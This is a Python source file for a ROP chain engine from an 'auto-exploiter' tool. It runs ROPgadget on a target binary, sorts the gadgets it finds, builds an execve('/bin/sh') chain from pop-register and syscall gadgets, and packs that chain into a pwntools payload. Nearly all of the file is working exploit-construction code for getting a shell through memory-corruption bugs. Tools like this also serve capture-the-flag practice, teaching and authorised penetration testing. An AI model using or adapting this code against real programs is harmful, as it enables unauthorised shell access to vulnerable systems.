"""
ROP Chain Generation Engine for DissectX Auto-Exploiter

Automatically finds ROP gadgets and constructs chains for exploitation.
"""

from typing import List, Optional, Dict, Tuple, Set
from dataclasses import dataclass
import subprocess
import re


@dataclass
class Gadget:
    """Represents a ROP gadget"""
    address: int
    instructions: str
    category: str  # 'pop', 'mov', 'syscall', 'ret', etc.


class ROPEngine:
    """
    Automated ROP chain generation using ROPgadget
    """
    
    def __init__(self, binary_path: str):
        self.binary_path = binary_path
        self.gadgets: List[Gadget] = []
        self.gadget_cache: Dict[str, List[Gadget]] = {}
        
    def find_gadgets(self, bad_bytes: Optional[Set[int]] = None) -> List[Gadget]:
        """
        Find all ROP gadgets in the binary using ROPgadget
        
        Args:
            bad_bytes: Set of bytes to avoid in gadget addresses
            
        Returns:
            List of found gadgets
        """
        try:
            # Run ROPgadget
            cmd = ['ROPgadget', '--binary', self.binary_path]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode != 0:
                print(f"[-] ROPgadget failed: {result.stderr}")
                return []
            
            # Parse output
            self.gadgets = self._parse_ropgadget_output(result.stdout, bad_bytes)
            
            # Categorize gadgets
            self._categorize_gadgets()
            
            print(f"[+] Found {len(self.gadgets)} usable gadgets")
            return self.gadgets
            
        except subprocess.TimeoutExpired:
            print("[-] ROPgadget timed out")
            return []
        except FileNotFoundError:
            print("[-] ROPgadget not installed. Install with: pip install ROPgadget")
            return []
        except Exception as e:
            print(f"[-] Gadget finding error: {e}")
            return []
    
    def _parse_ropgadget_output(self, output: str, bad_bytes: Optional[Set[int]]) -> List[Gadget]:
        """Parse ROPgadget output into Gadget objects"""
        gadgets = []
        
        for line in output.split('\n'):
            # Format: 0x00000000004005c3 : pop rdi ; ret
            match = re.match(r'(0x[0-9a-f]+)\s*:\s*(.+)', line)
            if match:
                addr_str, instrs = match.groups()
                addr = int(addr_str, 16)
                
                # Check for bad bytes
                if bad_bytes and self._contains_bad_bytes(addr, bad_bytes):
                    continue
                
                gadget = Gadget(
                    address=addr,
                    instructions=instrs.strip(),
                    category=self._categorize_instruction(instrs)
                )
                gadgets.append(gadget)
        
        return gadgets
    
    def _contains_bad_bytes(self, addr: int, bad_bytes: Set[int]) -> bool:
        """Check if address contains any bad bytes"""
        addr_bytes = addr.to_bytes(8, 'little')
        return any(b in bad_bytes for b in addr_bytes)
    
    def _categorize_instruction(self, instrs: str) -> str:
        """Categorize gadget by its primary instruction"""
        instrs_lower = instrs.lower()
        
        if 'pop' in instrs_lower:
            return 'pop'
        elif 'mov' in instrs_lower:
            return 'mov'
        elif 'syscall' in instrs_lower or 'int 0x80' in instrs_lower:
            return 'syscall'
        elif 'ret' in instrs_lower:
            return 'ret'
        elif 'add' in instrs_lower or 'sub' in instrs_lower:
            return 'arithmetic'
        elif 'xor' in instrs_lower:
            return 'xor'
        else:
            return 'other'
    
    def _categorize_gadgets(self) -> None:
        """Organize gadgets by category for quick lookup"""
        for gadget in self.gadgets:
            category = gadget.category
            if category not in self.gadget_cache:
                self.gadget_cache[category] = []
            self.gadget_cache[category].append(gadget)
    
    def find_pop_gadget(self, register: str) -> Optional[Gadget]:
        """
        Find a gadget that pops into a specific register
        
        Args:
            register: Register name (e.g., 'rdi', 'rsi', 'rdx')
            
        Returns:
            Gadget that pops into the register, or None
        """
        pop_gadgets = self.gadget_cache.get('pop', [])
        
        for gadget in pop_gadgets:
            if f'pop {register}' in gadget.instructions.lower():
                return gadget
        
        return None
    
    def find_syscall_gadget(self) -> Optional[Gadget]:
        """Find a syscall or int 0x80 gadget"""
        syscall_gadgets = self.gadget_cache.get('syscall', [])
        return syscall_gadgets[0] if syscall_gadgets else None
    
    def build_execve_chain(self, bin_sh_addr: int) -> Optional[List[Tuple[int, str]]]:
        """
        Build a ROP chain for execve("/bin/sh", NULL, NULL)
        
        Args:
            bin_sh_addr: Address of "/bin/sh" string
            
        Returns:
            List of (address, description) tuples forming the chain
        """
        chain = []
        
        # Find required gadgets
        pop_rdi = self.find_pop_gadget('rdi')
        pop_rsi = self.find_pop_gadget('rsi')
        pop_rdx = self.find_pop_gadget('rdx')
        pop_rax = self.find_pop_gadget('rax')
        syscall = self.find_syscall_gadget()
        
        if not all([pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall]):
            print("[-] Missing required gadgets for execve chain")
            return None
        
        # Build chain: execve("/bin/sh", NULL, NULL)
        # rax = 59 (execve syscall number)
        # rdi = address of "/bin/sh"
        # rsi = 0 (NULL)
        # rdx = 0 (NULL)
        
        chain.append((pop_rdi.address, f"pop rdi ; ret  # {hex(pop_rdi.address)}"))
        chain.append((bin_sh_addr, f"/bin/sh address  # {hex(bin_sh_addr)}"))
        
        chain.append((pop_rsi.address, f"pop rsi ; ret  # {hex(pop_rsi.address)}"))
        chain.append((0, "NULL"))
        
        chain.append((pop_rdx.address, f"pop rdx ; ret  # {hex(pop_rdx.address)}"))
        chain.append((0, "NULL"))
        
        chain.append((pop_rax.address, f"pop rax ; ret  # {hex(pop_rax.address)}"))
        chain.append((59, "execve syscall number"))
        
        chain.append((syscall.address, f"syscall  # {hex(syscall.address)}"))
        
        print(f"[+] Built execve ROP chain with {len(chain)} elements")
        return chain
    
    def chain_to_payload(self, chain: List[Tuple[int, str]], arch: str = 'amd64') -> bytes:
        """
        Convert ROP chain to bytes payload
        
        Args:
            chain: List of (address, description) tuples
            arch: Architecture ('i386' or 'amd64')
            
        Returns:
            Bytes payload
        """
        from pwn import p32, p64
        
        pack = p64 if arch == 'amd64' else p32
        payload = b''
        
        for addr, desc in chain:
            payload += pack(addr)
        
        return payload
